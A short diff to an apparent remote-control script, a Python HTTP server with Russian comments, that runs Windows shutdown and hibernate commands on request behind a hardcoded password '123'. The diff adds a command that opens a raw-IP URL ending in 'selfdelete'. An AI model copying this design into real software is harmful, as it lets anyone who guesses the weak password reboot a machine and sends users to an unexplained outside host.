@@ -3,6 +3,7 @@ import http.server
 import socketserver
 import os
 import json
+import webbrowser
 
 # Глобальная переменная для хранения пароля
 PASSWORD = "123"
@@ -35,9 +36,10 @@ class MyHTTPRequestHandler(http.server.BaseHTTPRequestHandler):
             os.system("shutdown /r /t 1")
         elif text == 'hb':
             os.system("shutdown /h")
+        elif text == 'br':
+            webbrowser.open('http://89.191.228.138:25566/selfdelete', new=2)
         else:
             toast("New Message", text)
-
 
 # Функция для запуска сервера
 def start_server():
